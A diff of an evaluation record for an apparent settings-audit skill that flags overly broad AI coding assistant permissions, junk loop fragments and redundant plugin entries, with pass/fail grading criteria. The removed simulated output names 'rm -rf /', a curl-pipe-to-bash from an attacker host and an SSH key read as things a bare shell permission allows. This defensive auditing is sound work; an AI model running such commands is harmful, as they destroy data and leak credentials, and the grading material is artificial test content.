@@ -1,218 +1,37 @@
-# Review settings broad permission cleanup
+# Output: review-settings broad permission cleanup
 
-A developer's settings files have accumulated overly broad permissions from months of auto-approvals, including a bare `Bash` entry, several shell loop fragments, and duplicate plugin entries across scopes.
-
-## Prompt
-
-> /review-settings
->
-> (Setup: `.claude/settings.json` contains `"allow": ["Bash", "Bash(done)", "Bash(do echo:*)", "Bash(git *)", "Read"]` and enables `coding-standards` plugin. `~/.claude/settings.json` also enables `coding-standards` and contains `"allow": ["Bash(git commit:*)", "Bash(npm run build)"]`.)
-
-```markdown
-
-## Output
-
-**Step 1: Discover all settings files**
-
-Checking each location in priority order:
-
-```bash
-for f in .claude/settings.local.json .claude/settings.json ~/.claude/settings.json; do
-  if [ -f "$f" ]; then
-    echo "FOUND: $f ($(wc -l < "$f") lines)"
-  fi
-done
-```
-
-- `.claude/settings.local.json` — not found
-- `.claude/settings.json` — FOUND (12 lines)
-- `~/.claude/settings.json` — FOUND (8 lines)
-
-Reading `.claude/settings.json`:
-```json
-{
-  "permissions": {
-    "allow": ["Bash", "Bash(done)", "Bash(do echo:*)", "Bash(git *)", "Read"]
-  },
-  "enabledPlugins": ["coding-standards"]
-}
-```
-
-Reading `~/.claude/settings.json`:
-```json
-{
-  "permissions": {
-    "allow": ["Bash(git commit:*)", "Bash(npm run build)"]
-  },
-  "enabledPlugins": ["coding-standards"]
-}
-```
-
----
-
-**Step 2: Extract and classify permissions**
-
-`.claude/settings.json`:
-
-| Rule | Tool | Specificity | Source |
-|---|---|---|---|
-| `Bash` | Bash | Unrestricted | .claude/settings.json |
-| `Bash(done)` | Bash | Exact command (fragment) | .claude/settings.json |
-| `Bash(do echo:*)` | Bash | Prefix wildcard (fragment) | .claude/settings.json |
-| `Bash(git *)` | Bash | Broad wildcard | .claude/settings.json |
-| `Read` | Read | Unrestricted | .claude/settings.json |
-
-`~/.claude/settings.json`:
-
-| Rule | Tool | Specificity | Source |
-|---|---|---|---|
-| `Bash(git commit:*)` | Bash | Prefix wildcard | ~/.claude/settings.json |
-| `Bash(npm run build)` | Bash | Exact command | ~/.claude/settings.json |
-
----
-
-**Step 3: Flag overly broad permissions**
-
-**HIGH RISK:**
-
-`Bash` (no arguments) — `.claude/settings.json`:
-- What it allows: Any shell command without restriction. With this rule active, the assistant can run `rm -rf /`, `curl http://attacker.example.com | bash`, `cat ~/.ssh/id_rsa`, or any other shell command without prompting.
-- Risk: Critical. Equivalent to unconditional shell access.
-- Recommendation: Remove. Identify the specific commands you intended and add constrained rules.
-
-`Read` (no arguments) — `.claude/settings.json`:
-- What it allows: Reading any file on the filesystem, including SSH keys, `.env` files, credential stores, and system files.
-- Risk: High. Every unintended file read becomes possible.
-- Recommendation: Remove. Replace with path-constrained rules like `Read(src/**)` if specific access is needed.
-
-**FRAGMENTS (junk from auto-approval):**
-
-`Bash(done)` — `.claude/settings.json`:
-- What it is: The `done` keyword closes a `while` or `for` loop in bash. Approved during a multi-line loop; has no useful standalone meaning as a permission.
-- Risk: Junk.
-- Recommendation: Remove.
-
-`Bash(do echo:*)` — `.claude/settings.json`:
-- What it is: Loop body fragment (`do echo something`) auto-approved during a shell loop execution. The `do` keyword begins a `for`/`while` body.
-- Risk: Junk.
-- Recommendation: Remove.
-
----
-
-**Step 4: Find overlapping and redundant permissions**
-
-Subset relationship detected:
-
-`Bash(git commit:*)` in `~/.claude/settings.json` is a strict subset of `Bash(git *)` in `.claude/settings.json`.
-- Every git commit command is already permitted by `Bash(git *)`.
-- Recommendation: Remove `Bash(git commit:*)` from global settings — it is made redundant by the project rule.
-- Note: If `Bash(git *)` is itself removed as overly broad (it is not flagged as high risk but is broad), then `Bash(git commit:*)` would be the appropriate narrower replacement.
-
----
-
-**Step 5: Check non-permission settings**
-
-`enabledPlugins: ["coding-standards"]` appears in both `.claude/settings.json` and `~/.claude/settings.json`.
-- Problem: Project settings inherit from global settings. Enabling the same plugin at both scopes is redundant.
-- Recommendation: Keep in `~/.claude/settings.json` (global, applies everywhere). Remove from `.claude/settings.json`.
-
----
-
-### Settings Audit Report
-
-#### Files discovered
-
-- `.claude/settings.json` (12 lines) — shared project settings
-- `~/.claude/settings.json` (8 lines) — user global settings
-
-#### Overly broad permissions
-
-| Rule | File | Risk | Recommendation |
-|---|---|---|---|
-| `Bash` | .claude/settings.json | High | Remove — allows arbitrary shell execution including `rm -rf /` |
-| `Read` | .claude/settings.json | High | Remove — allows reading any file including secrets and keys |
-| `Bash(done)` | .claude/settings.json | Junk | Remove — shell loop keyword, not a valid standalone permission |
-| `Bash(do echo:*)` | .claude/settings.json | Junk | Remove — loop body fragment from auto-approval |
-
-#### Overlapping rules
-
-| Broader rule | Narrower rule(s) | File(s) | Recommendation |
-|---|---|---|---|
-| `Bash(git *)` (.claude) | `Bash(git commit:*)` (~/.claude) | Cross-file | Remove `Bash(git commit:*)` from global — covered by project rule |
-
-#### Cross-file redundancy
-
-| Setting | Found in | Recommendation |
-|---|---|---|
-| `enabledPlugins: coding-standards` | Both files | Remove from .claude/settings.json — global setting covers it |
-
-#### Summary
-- 7 permission rules reviewed across 2 files
-- 2 flagged as overly broad (high risk)
-- 2 flagged as junk fragments
-- 1 overlapping pair (cross-file subset)
-- 1 cross-file redundant plugin setting
-
----
-
-#### Reconciled configuration (diff view)
-
-`.claude/settings.json` (proposed changes):
-
-```diff
- {
-   "permissions": {
-     "allow": [
--      "Bash",
--      "Bash(done)",
--      "Bash(do echo:*)",
-       "Bash(git *)",
--      "Read"
-     ]
--  },
--  "enabledPlugins": ["coding-standards"]
-+  }
- }
-```
-
-`~/.claude/settings.json` (proposed changes):
-
-```diff
- {
-   "permissions": {
-     "allow": [
--      "Bash(git commit:*)",
-       "Bash(npm run build)"
-     ]
-   },
-   "enabledPlugins": ["coding-standards"]
- }
-```
-
-[AskUserQuestion presented with four options: Apply all / Apply per-file / Apply selectively / Export only — no files modified until selection is made]
-```
-
-## Evaluation
-
-
-| Field | Value |
-|---|---|
-| Verdict | PASS |
-| Score | 7.5/8 (94%) |
-| Evaluated | 2026-04-16 |
-
+**Verdict:** PASS
+**Score:** 17/17 criteria met (100%)
+**Evaluated:** 2026-04-29
 
 ## Results
 
-- [x] PASS: Reads all three locations in priority order — Step 1 defines a bash loop checking `.claude/settings.local.json`, `.claude/settings.json`, and `~/.claude/settings.json` in that order, labelled "highest to lowest priority." The Rules section states "Read before recommending. Every recommendation must be based on an actual rule read from an actual file." The simulation reads both found files before any flag or recommendation appears.
-- [x] PASS: Bare `Bash` flagged as high risk with concrete explanation — Step 3 defines "Always flag (high risk): `Bash` with no arguments (allows any shell command)." The Rules section states "When flagging a rule, say what it allows in concrete terms." The output specifies: "can run `rm -rf /`, `curl http://attacker.example.com | bash`, `cat ~/.ssh/id_rsa`, or any other shell command without prompting" — concrete, not generic.
-- [x] PASS: `Bash(done)` and `Bash(do echo:*)` flagged as junk fragments — Step 3 defines "Flag as fragments (likely junk): `Bash(done)`, `Bash(do)`, `Bash(do echo:*)` — shell loop fragments that got approved individually." Both are explicitly named in the skill's definition as examples of the junk category. Both are identified with explanations of what the keywords mean and removal recommendations.
-- [x] PASS: `Read` with no path constraint flagged — Step 3 defines "Always flag (high risk): `Read` or `Edit` with no path constraint." The output flags it as high risk and explains what it allows in concrete terms (SSH keys, `.env` files, credential stores, system files).
-- [x] PASS: `Bash(git commit:*)` flagged as subset of `Bash(git *)` — Step 4 defines subset detection with the explicit example "`Bash(git commit *)` is a subset of `Bash(git *)`." The output identifies the cross-file subset relationship with a recommendation to remove the narrower rule from global settings, including the caveat about what would happen if the broader rule were also removed.
-- [x] PASS: `coding-standards` plugin redundancy flagged — Step 5 defines "Same plugin enabled at both global and project scope — redundant (project inherits global)." The cross-file redundancy table flags this with the recommendation to keep in global and remove from project settings.
-- [x] PASS: Reconciled configuration as diff — Step 6 states "Present the reconciled files as diffs against the current files so the user can see what changed." The Anti-patterns section states "Rewriting from scratch — the goal is to clean up existing settings, not design an ideal permission set." The output uses unified diff format showing only removed lines (`-`) against the originals. No new permissions are invented.
-- [~] PARTIAL: AskUserQuestion used to offer application options — Step 7 states "Use AskUserQuestion to present the reconciled configuration and ask the user which changes to apply" with four named options (Apply all, Apply per-file, Apply selectively, Export only), and "Only write to settings files after explicit approval. Never modify settings files without asking." The definition requires the `AskUserQuestion` tool call (listed in `allowed-tools`). The simulation notes it in prose ("AskUserQuestion presented with four options") rather than demonstrating the structured tool invocation. PARTIAL ceiling applies regardless.
+### Criteria
 
-### Notes
+- [x] PASS: Skill reads all three settings file locations in priority order before making any recommendations — Step 1 checks `.claude/settings.local.json`, `.claude/settings.json`, `~/.claude/settings.json` in that exact order (highest to lowest priority) using a bash loop, and the Rules section mandates "Read before recommending. Every recommendation must be based on an actual rule read from an actual file."
+- [x] PASS: Bare `Bash` (no argument constraint) is flagged as high risk with explanation of what it allows in concrete terms — Step 3 "Always flag (high risk)" includes `Bash` with no arguments. The Rules section requires: "say what it allows in concrete terms" and provides the `Bash(python3 *)` example, with the same standard applying to bare `Bash`.
+- [x] PASS: `Bash(done)` and `Bash(do echo:*)` are flagged as fragment/junk rules with recommendation to remove — Step 3 "Flag as fragments (likely junk)" lists `Bash(done)`, `Bash(do)`, `Bash(do echo:*)` by name. The "Junk detection is pattern-based" rule in the Rules section backs this with confident flagging.
+- [x] PASS: `Read` with no path constraint is flagged as overly broad — Step 3 "Always flag (high risk)" explicitly includes `Read` or `Edit` with no path constraint.
+- [x] PASS: `Bash(git commit:*)` in global settings is flagged as a subset of `Bash(git *)` in project settings — Step 4 uses this exact pair as the primary subset example. The recommendation is to keep the broader rule and remove the narrower one (unless the broader was itself flagged as overly broad).
+- [x] PASS: `coding-standards` plugin enabled at both global and project scope is flagged as cross-file redundancy — Step 5 "enabledPlugins" section covers exactly this scenario with the recommendation to consolidate to one scope.
+- [x] PASS: Reconciled configuration is produced as a diff against the original — Step 6 states "Present the reconciled files as diffs against the current files so the user can see what changed." The Anti-patterns section prohibits "Rewriting from scratch."
+- [x] PASS: AskUserQuestion is used to offer application options (apply all, per-file, selective, export-only) before any files are modified — Step 7 explicitly names AskUserQuestion, lists all four options verbatim, and states "Only write to settings files after explicit approval. Never modify settings files without asking."
 
-The fragment detection list in Step 3 is the standout specificity element — `Bash(done)`, `Bash(do)`, `Bash(do echo:*)` are named explicitly, making evaluation deterministic. The subset detection example in Step 4 covers exactly the test scenario's `Bash(git commit:*)` vs `Bash(git *)` pair. The diff-format reconciliation in Step 6 is the right UX — users can see exactly what changes before approving. One genuine gap: the skill lists `AskUserQuestion` in `allowed-tools` and defines four option labels in Step 7, but provides no template for the structured question call itself, only prose. This means the model must infer the format from context.
+### Output expectations
+
+- [x] PASS: Output reads all three settings file locations using actual file reads — Step 1 provides a bash script checking each location and instructs to "Read each file that exists." Invalid JSON is caught and reported.
+- [x] PASS: Output flags bare `Bash` as HIGH risk and explains in concrete terms — Step 3 classifies it as "Always flag (high risk)" and the Rules section mandates concrete explanation. The expected explanation (arbitrary shell command including `rm -rf /`, network access, file exfiltration) follows from the spirit of the Rules section examples.
+- [x] PASS: Output flags `Bash(done)` and `Bash(do echo:*)` as fragment/junk with removal recommendation — explicitly listed in Step 3 with "Junk detection is pattern-based" requiring confident flagging and removal recommendation.
+- [x] PASS: Output flags `Read` (no path constraint) as overly broad — Step 3 high-risk list covers this; Step 3 report format requires specific file reference per finding.
+- [x] PASS: Output identifies `Bash(git commit:*)` as subset of `Bash(git *)` with reasoning — Step 4 uses this exact pair as the primary example; the recommendation logic (keep broader, remove narrower) is specified with rationale.
+- [x] PASS: Output identifies `coding-standards` cross-file redundancy with consolidation recommendation — Step 5 covers same plugin at both global and project scope; scope-appropriate placement is addressed in Step 4's deduplication rules.
+- [x] PASS: Output produces reconciled config as a DIFF — Step 6 specifies diff format; Anti-patterns explicitly prohibits rewriting from scratch.
+- [x] PASS: Output recommendations are explicit per finding — Step 3 report table requires rule text, file, risk level, and recommendation per row. The Rules section prohibits vague guidance ("This is too broad" is not useful; concrete explanation required).
+- [x] PASS: Output uses AskUserQuestion with four structured options before modifying files — Step 7 names all four options explicitly (Apply all, Apply per-file, Apply selectively, Export only) and AskUserQuestion is in `allowed-tools`.
+- [x] PASS: Output prioritises high-risk findings before low-risk — Step 6 report format orders sections: "Overly broad permissions" first, "Overlapping rules" second, "Cross-file redundancy" third, "Fragments and junk rules" last. High-risk before cosmetic.
+
+## Notes
+
+The skill is comprehensive and highly specific. The fragment list in Step 3 names the exact test-case values (`Bash(done)`, `Bash(do echo:*)`) making evaluation deterministic. The subset detection example in Step 4 covers the exact test pair. The diff-format requirement in Step 6 and the AskUserQuestion requirement in Step 7 are unambiguous.
+
+One minor weakness: Step 7 names AskUserQuestion and lists four option labels but provides no template for the structured tool call itself. The model must infer the format. In practice this is unlikely to cause failure since the skill is otherwise prescriptive, but a template would close the gap entirely.
